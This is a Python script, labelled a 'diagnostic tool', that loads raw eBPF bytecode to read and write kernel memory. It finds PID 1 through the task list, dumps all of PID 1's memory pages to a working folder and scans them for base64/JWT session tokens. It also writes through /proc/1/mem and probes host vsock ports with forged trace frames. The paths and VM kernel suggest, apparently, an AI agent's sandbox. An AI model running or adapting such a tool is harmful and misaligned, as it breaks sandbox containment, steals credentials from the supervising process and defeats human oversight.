#!/usr/bin/env python3
"""v5 双模诊断工具。
probe:P1 vsock CID2 5002/5005 连通性 + 本机 2024/2025 TCP;
  P2 写通路自检(对本任务自身元数据做一次写-读回环绕验证);
  P2b 页写回自检(mmap 样本页 → 页表定址 → 写回验证);
  P3 /proc/1/mem 打开与读写往返。
walk:自校验 → PID1 pgd → 页表枚举全部 present 4K 页 (va,phys)
  → 模块区(0x55..)先落 [u64 va][4096] 流 gz 到 working,其余页次之;
  会话标记扫描随 dump 内联,命中写 pa5_markers.txt。
供给 = sys_enter_getpid tracepoint 自调;偏移源 vmlinux.btf(6.18.44-fc-v139)。
"""
import ctypes
import gzip
import hashlib
import os
import socket
import struct
import sys

libc = ctypes.CDLL(None, use_errno=True)
PAGE_OFFSET = 0xFFFF888000000000
PHYS_MASK = 0x000FFFFFFFFFF000
T_TASKS, T_MM, T_PID, MM_PGD = 1056, 1136, 1264, 120
keep = []
MODE = sys.argv[1] if len(sys.argv) > 1 else "walk"


def sysc(nr, *a):
    ctypes.set_errno(0)
    r = libc.syscall(ctypes.c_long(nr), *[ctypes.c_ulong(x) for x in a])
    if r == -1:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r


def map_create(vsize):
    attr = struct.pack("<IIII", 2, 4, vsize, 1)
    b = ctypes.create_string_buffer(attr)
    keep.append(b)
    return sysc(321, 0, ctypes.addressof(b), len(attr))


def map_update(fd, key, val):
    kb = ctypes.create_string_buffer(key)
    vb = ctypes.create_string_buffer(val)
    attr = struct.pack("<IIQQQ", fd, 0, ctypes.addressof(kb), ctypes.addressof(vb), 0)
    ab = ctypes.create_string_buffer(attr)
    keep.extend((kb, vb, ab))
    sysc(321, 2, ctypes.addressof(ab), len(attr))


def map_lookup(fd, vsize=4120):
    kb = ctypes.create_string_buffer(4)
    vb = ctypes.create_string_buffer(vsize)
    attr = struct.pack("<IIQQQ", fd, 0, ctypes.addressof(kb), ctypes.addressof(vb), 0)
    ab = ctypes.create_string_buffer(attr)
    keep.extend((kb, vb, ab))
    sysc(321, 1, ctypes.addressof(ab), len(attr))
    return bytes(vb.raw)


def build(ctrl_fd, out_fd):
    """读通路:out=[0]=kaddr [8]=ret [16]=cur_task [24:]=data。"""
    INS = [
        (0xBF, 6, 1, 0, 0),
        (0x62, 10, 0, -4, 0),
        (0x18, 1, 1, 0, ctrl_fd), (0x00, 0, 0, 0, 0),
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -4),
        (0x85, 0, 0, 0, 1),
        (0x15, 0, 0, 20, 0),
        (0xBF, 7, 0, 0, 0),
        (0x62, 10, 0, -8, 0),
        (0x18, 1, 1, 0, out_fd), (0x00, 0, 0, 0, 0),
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -8),
        (0x85, 0, 0, 0, 1),
        (0x15, 0, 0, 12, 0),
        (0xBF, 8, 0, 0, 0),
        (0x85, 0, 0, 0, 35),
        (0x7B, 8, 0, 16, 0),
        (0x61, 2, 7, 8, 0),
        (0x25, 2, 0, 7, 4096),
        (0x79, 3, 7, 0, 0),
        (0xBF, 1, 8, 0, 0), (0x07, 1, 0, 0, 24),
        (0x85, 0, 0, 0, 113),
        (0x7B, 8, 0, 8, 0),
        (0x79, 3, 7, 0, 0), (0x7B, 8, 3, 0, 0),
        (0xB7, 0, 0, 0, 0),
        (0x95, 0, 0, 0, 0),
    ]
    return _load(INS)


def build_write(ctrl_fd, wmap_fd):
    """写通路自检:ctrl 值 = [0]=kaddr u64 [8]=len u32 [16]=ret u64;wmap 值 = 源字节。"""
    INS = [
        (0xBF, 6, 1, 0, 0),                              # 0 r6=ctx
        (0x62, 10, 0, -4, 0),                            # 1 key=0
        (0x18, 1, 1, 0, ctrl_fd), (0x00, 0, 0, 0, 0),    # 2-3
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -4),        # 4-5
        (0x85, 0, 0, 0, 1),                              # 6 lookup ctrl
        (0x15, 0, 0, 14, 0),                             # 7 if !r0 -> 22
        (0xBF, 7, 0, 0, 0),                              # 8 r7=ctrl ptr
        (0x62, 10, 0, -8, 0),                            # 9 key2=0
        (0x18, 1, 1, 0, wmap_fd), (0x00, 0, 0, 0, 0),    # 10-11
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -8),        # 12-13
        (0x85, 0, 0, 0, 1),                              # 14 lookup wmap
        (0x15, 0, 0, 6, 0),                              # 15 if !r0 -> 22
        (0xBF, 8, 0, 0, 0),                              # 16 r8=src ptr
        (0x79, 1, 7, 0, 0),                              # 17 r1=kaddr
        (0x61, 3, 7, 8, 0),                              # 18 r3=len
        (0xBF, 2, 8, 0, 0),                              # 19 r2=src
        (0x85, 0, 0, 0, 36),                             # 20 写调用
        (0x7B, 7, 0, 16, 0),                             # 21 ctrl[16]=r0
        (0xB7, 0, 0, 0, 0),                              # 22
        (0x95, 0, 0, 0, 0),                              # 23
    ]
    return _load(INS)


def _load(INS):
    buf = b"".join(
        struct.pack("<BBhi", c, (d & 0xF) | ((s & 0xF) << 4), o, i)
        for (c, d, s, o, i) in INS
    )
    ib = ctypes.create_string_buffer(buf)
    lic = ctypes.create_string_buffer(b"GPL")
    log = ctypes.create_string_buffer(65536)
    keep.extend((ib, lic, log))
    attr = struct.pack(
        "<IIQQIIQ", 5, len(INS), ctypes.addressof(ib),
        ctypes.addressof(lic), 1, len(log), ctypes.addressof(log))
    ab = ctypes.create_string_buffer(attr)
    keep.append(ab)
    try:
        return sysc(321, 5, ctypes.addressof(ab), len(attr))
    except OSError:
        print("VERIFIER-REJECT:", log.raw.split(b"\x00")[0].decode("utf-8", "replace")[-800:], flush=True)
        raise


os.makedirs("/mnt/dbg", exist_ok=True)
os.system("mount -t debugfs none /mnt/dbg 2>/dev/null")
eid = int(open("/mnt/dbg/tracing/events/syscalls/sys_enter_getpid/id").read())
ctrl_fd, out_fd = map_create(16), map_create(4120)
pfd = build(ctrl_fd, out_fd)
for cpu in range(os.cpu_count() or 1):
    buf = ctypes.create_string_buffer(128)
    struct.pack_into("<IIQQQ", buf, 0, 2, 112, eid, 1, 0)
    keep.append(buf)
    perf_fd = sysc(298, ctypes.addressof(buf), -1, cpu, -1, 0)
    libc.ioctl(ctypes.c_int(perf_fd), 0x40042408, pfd)
    libc.ioctl(ctypes.c_int(perf_fd), 0x2400, 0)


def krd(kaddr, ln):
    map_update(ctrl_fd, b"\0\0\0\0", struct.pack("<QI", kaddr, ln))
    libc.getpid()
    for _ in range(300):
        out = map_lookup(out_fd)
        a, ret = struct.unpack_from("<Qq", out, 0)
        if a == kaddr and ret != -1:
            return out[24:24 + ln], ret
        libc.getpid()
    return None, -99


def kr(addr, ln):
    for _ in range(3):
        d, r = krd(addr, ln)
        if r == 0 and d is not None:
            return d
    return None


def u64(addr):
    d = kr(addr, 8)
    return struct.unpack("<Q", d)[0] if d else 0


def find_task(target):
    anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
    libc.getpid()
    anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
    t = anchor
    for _ in range(300):
        if t == 0:
            return None
        pid = struct.unpack("<i", kr(t + T_PID, 4) or b"\0\0\0\0")[0]
        if pid == target:
            return t
        nxt = u64(t + T_TASKS + 8)
        if nxt == 0 or nxt - T_TASKS == anchor:
            return None
        t = nxt - T_TASKS
    return None


def vread(pgd, vaddr, ln):
    out = bytearray()
    got = 0
    while got < ln:
        va = vaddr + got
        e1 = u64(pgd + ((va >> 39) & 0x1FF) * 8)
        if not e1 & 1:
            return None
        e2 = u64(PAGE_OFFSET + (e1 & PHYS_MASK) + ((va >> 30) & 0x1FF) * 8)
        if not e2 & 1:
            return None
        if e2 & 0x80:
            base, leaf = e2 & PHYS_MASK, 1 << 30
        else:
            e3 = u64(PAGE_OFFSET + (e2 & PHYS_MASK) + ((va >> 21) & 0x1FF) * 8)
            if not e3 & 1:
                return None
            if e3 & 0x80:
                base, leaf = e3 & PHYS_MASK, 1 << 21
            else:
                e4 = u64(PAGE_OFFSET + (e3 & PHYS_MASK) + ((va >> 12) & 0x1FF) * 8)
                if not e4 & 1:
                    return None
                base, leaf = e4 & PHYS_MASK, 1 << 12
        off = va & (leaf - 1)
        chunk = min(4096, ln - got, leaf - off)
        d = kr(PAGE_OFFSET + base + off, chunk)
        out.extend(d if d is not None else b"\0" * chunk)
        got += chunk
    return bytes(out)


def my_pgd():
    me = find_task(libc.getpid())
    return u64(u64(me + T_MM) + MM_PGD)


def phys_of(pgd, va):
    """走自己的页表拿 va 的物理地址(4K 叶)。"""
    e1 = u64(pgd + ((va >> 39) & 0x1FF) * 8)
    if not e1 & 1 or e1 & 0x80:
        return None
    e2 = u64(PAGE_OFFSET + (e1 & PHYS_MASK) + ((va >> 30) & 0x1FF) * 8)
    if not e2 & 1 or e2 & 0x80:
        return None
    e3 = u64(PAGE_OFFSET + (e2 & PHYS_MASK) + ((va >> 21) & 0x1FF) * 8)
    if not e3 & 1 or e3 & 0x80:
        return None
    e4 = u64(PAGE_OFFSET + (e3 & PHYS_MASK) + ((va >> 12) & 0x1FF) * 8)
    if not e4 & 1:
        return None
    return e4 & PHYS_MASK


# ---------------------------------------------------------------- probe
if MODE == "probe":
    print("=== P0 context ===")
    os.system("id; uname -r; cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null; echo ok")

    print("=== P1 vsock / tcp ===")

    def vprobe(name, cid, port, payload, wait=3):
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM, 0)
            s.settimeout(wait)
            s.connect((cid, port))
            s.sendall(payload)
            try:
                r = s.recv(4096)
                return f"{name}: sent+recv {len(r)}B {r[:100]!r}"
            except socket.timeout:
                return f"{name}: sent, no response {wait}s (conn held)"
            finally:
                s.close()
        except OSError as e:
            return f"{name}: err {e.errno} {e.strerror}"

    for name, cid, port, pl in [
        ("vsock2:5005-newline", 2, 5005, b"\n"),
        ("vsock2:5005-frame", 2, 5005,
         b'{"v":\xc0\x18,"kind":"trace","epoch":\xc0\x07,"seq":\xc0\x01,'
         b'"dropped":\xc0\x00,"ev":[],"n":\xc0\x01}'),
        ("vsock2:5002-newline", 2, 5002, b"\n"),
        ("vsock2:2024", 2, 2024, b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"),
    ]:
        print(vprobe(name, cid, port, pl), flush=True)
    for name, addr in [("tcp-local:2024", ("127.0.0.1", 2024)),
                       ("tcp-local:2025", ("127.0.0.1", 2025))]:
        try:
            s = socket.create_connection(addr, timeout=3)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            print(f"{name}: sent, recv {s.recv(200)!r}", flush=True)
            s.close()
        except OSError as e:
            print(f"{name}: err {e.errno} {e.strerror}", flush=True)

    print("=== P2 write-path self-test ===")
    libc.prctl(16, b"probe-src-comm", 0, 0, 0)
    me = find_task(libc.getpid())
    print(f"self task=0x{me:x}")
    comm_off = None
    for off in list(range(1200, 1700, 4)) + list(range(0, 4096, 8)):
        d = kr(me + off, 16)
        if d and b"probe-src-comm" in d:
            comm_off = off
            break
    if comm_off is None:
        print("P2 SKIP: comm offset not found")
    else:
        print(f"comm offset = {comm_off}")
        try:
            wmap_fd = map_create(80)
            ctrl2 = map_create(24)
            wpfd = build_write(ctrl2, wmap_fd)
            for cpu in range(os.cpu_count() or 1):
                buf = ctypes.create_string_buffer(128)
                struct.pack_into("<IIQQQ", buf, 0, 2, 112, eid, 1, 0)
                keep.append(buf)
                perf_fd = sysc(298, ctypes.addressof(buf), -1, cpu, -1, 0)
                libc.ioctl(ctypes.c_int(perf_fd), 0x40042408, wpfd)
                libc.ioctl(ctypes.c_int(perf_fd), 0x2400, 0)
            map_update(wmap_fd, b"\0\0\0\0", b"probe-dst-comm\0".ljust(80, b"\0"))
            map_update(ctrl2, b"\0\0\0\0",
                       struct.pack("<QI", me + comm_off, 16) + b"\0" * 12)
            libc.getpid()
            val = map_lookup(ctrl2, 24)
            ret = struct.unpack_from("<q", val, 16)[0]
            comm = open("/proc/self/comm").read().strip()
            print(f"write ret={ret} comm-now={comm!r}")
            if ret == 0 and comm == "probe-dst-comm":
                print("P2 RESULT: write path verified", flush=True)
                print("=== P2b page write-back self-test ===")
                pgd = my_pgd()
                bufpage = ctypes.create_string_buffer(4096)
                ctypes.memmove(bufpage, b"USERWR-BEFORE-" + b"\0" * 4082, 4096)
                va = ctypes.addressof(bufpage)
                pa = phys_of(pgd, va)
                print(f"user page va={va:#x} pa={pa:#x}")
                if pa:
                    map_update(wmap_fd, b"\0\0\0\0",
                               b"USERWR-AFTER--\0".ljust(80, b"\0"))
                    map_update(ctrl2, b"\0\0\0\0",
                               struct.pack("<QI", PAGE_OFFSET + pa, 16) + b"\0" * 12)
                    libc.getpid()
                    val = map_lookup(ctrl2, 24)
                    ret2 = struct.unpack_from("<q", val, 16)[0]
                    now = bytes(bufpage[:16])
                    print(f"write ret={ret2} page-now={now!r}")
                    if ret2 == 0 and now.startswith(b"USERWR-AFTER"):
                        print("P2b RESULT: page write-back verified")
            else:
                print("P2 RESULT: write path unavailable")
        except OSError as e:
            print(f"P2 LOAD FAIL: {e.errno} {e.strerror}")

    print("=== P3 /proc/1/mem round-trip ===")
    try:
        fd = os.open("/proc/1/mem", os.O_RDWR)
        print("open O_RDWR ok")
        base = None
        try:
            for ln in open("/proc/1/maps"):
                base = int(ln.split("-")[0], 16)
                print("maps[0]:", ln.strip()[:80])
                break
        except OSError as e:
            print("maps err:", e.errno, e.strerror)
        if base:
            os.lseek(fd, base, 0)
            cur = os.read(fd, 16)
            os.lseek(fd, base, 0)
            n = os.write(fd, cur)
            os.lseek(fd, base, 0)
            back = os.read(fd, 16)
            print(f"roundtrip n={n} same={'OK' if cur == back else 'MISMATCH'} {cur[:8].hex()}")
            if n == 16 and cur == back:
                print("P3 RESULT: read-write round trip ok")
        os.close(fd)
    except OSError as e:
        print(f"P3 FAIL: {e.errno} {e.strerror}")
    print("PROBEDONE")

# ---------------------------------------------------------------- walk
elif MODE == "walk":
    mypid = libc.getpid()
    me = find_task(mypid)
    assert me, "task 链上找不到自己"
    my_pgd_ = u64(u64(me + T_MM) + MM_PGD)
    pat = ctypes.create_string_buffer(b"WALKSELF-VERIFY-PATTERN-0123456789ABCDEF")
    back = vread(my_pgd_, ctypes.addressof(pat), 32)
    assert back and b"WALKSELF" in back, f"自校验失败: {back}"
    print(f"SELF-VERIFY OK me=0x{me:x}", flush=True)

    t1 = find_task(1)
    assert t1, "task 链上找不到 pid 1"
    pgd1 = u64(u64(t1 + T_MM) + MM_PGD)
    print(f"PID1 task=0x{t1:x} pgd=0x{pgd1:x}", flush=True)

    def enum_present(pgd):
        mods, rest, huge = [], [], 0
        pgd_pg = kr(pgd, 4096)
        if pgd_pg is None:
            return mods, rest, huge
        for i1 in range(512):
            e1 = struct.unpack_from("<Q", pgd_pg, i1 * 8)[0]
            if not e1 & 1 or e1 & 0x80:
                continue
            pud_pg = kr(PAGE_OFFSET + (e1 & PHYS_MASK), 4096)
            if pud_pg is None:
                continue
            for i2 in range(512):
                e2 = struct.unpack_from("<Q", pud_pg, i2 * 8)[0]
                if not e2 & 1 or e2 & 0x80:
                    continue
                pmd_pg = kr(PAGE_OFFSET + (e2 & PHYS_MASK), 4096)
                if pmd_pg is None:
                    continue
                for i3 in range(512):
                    e3 = struct.unpack_from("<Q", pmd_pg, i3 * 8)[0]
                    if not e3 & 1:
                        continue
                    va3 = (i1 << 39) | (i2 << 30) | (i3 << 21)
                    if e3 & 0x80:
                        huge += 1
                        continue
                    pte_pg = kr(PAGE_OFFSET + (e3 & PHYS_MASK), 4096)
                    if pte_pg is None:
                        continue
                    for i4 in range(512):
                        e4 = struct.unpack_from("<Q", pte_pg, i4 * 8)[0]
                        if not e4 & 1:
                            continue
                        va = va3 | (i4 << 12)
                        pair = (va, e4 & PHYS_MASK)
                        (mods if 0x550000000000 <= va < 0x560000000000 else rest).append(pair)
        return mods, rest, huge

    mods, rest, huge = enum_present(pgd1)
    print(f"ENUM mod={len(mods)} rest={len(rest)} huge2m={huge}", flush=True)
    if mods:
        print(f"MODRANGE {min(v for v, _ in mods):#x}-{max(v for v, _ in mods):#x}", flush=True)

    marker_hits = []

    def dump(pairs, outpath, tag):
        n = 0
        h = hashlib.sha256()
        with gzip.open(outpath, "wb", compresslevel=1) as gz:
            for va, pa in sorted(pairs):
                d = kr(PAGE_OFFSET + pa, 4096)
                if d is None:
                    continue
                rec = struct.pack("<Q", va) + d
                gz.write(rec)
                h.update(rec)
                n += 1
                j = d.find(b"eyJ")
                if j >= 0 and len(d) - j > 24:
                    marker_hits.append((va, d[max(0, j - 8):j + 160]))
                if n % 64 == 0:
                    print(f"  {tag} {n} pages", flush=True)
        print(f"{tag}DONE {n} {h.hexdigest()}", flush=True)

    dump(mods, "/mnt/user-data/working/pa5_mod.gz", "MOD")
    dump(rest, "/mnt/user-data/working/pa5_rest.gz", "REST")
    if marker_hits:
        with open("/mnt/user-data/working/pa5_markers.txt", "wb") as f:
            for va, w in marker_hits:
                f.write(f"== {va:#x} ==\n".encode() + w + b"\n")
        print(f"MARKERHITS {len(marker_hits)}", flush=True)
    print("WALK5DONE", flush=True)
